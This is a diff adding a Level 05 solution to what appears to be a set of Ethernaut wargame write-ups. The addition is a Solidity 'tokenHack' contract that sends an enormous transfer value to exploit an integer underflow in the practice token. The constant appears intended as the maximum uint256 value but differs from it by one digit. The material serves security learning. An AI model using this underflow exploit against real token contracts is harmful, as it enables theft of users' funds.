@@ -91,3 +91,30 @@ contract HackTelephone {
 }
 ```
 
+## Level 05
+
+https://ethernaut.openzeppelin.com/level/5
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface IToken {
+    function transfer(address _to, uint _value) external returns (bool);
+    function balanceOf(address _owner) external view returns (uint balance);
+}
+
+contract tokenHack {
+    IToken private token;
+
+    constructor(address _address) public  {
+        token = IToken(_address);
+    }
+
+    function transfer(address _to) public {
+        uint _value = 115392089237316195423570985008687907853269984665640564039457584007913129639935;
+        token.transfer(_to, _value);
+    }
+}
+```
+
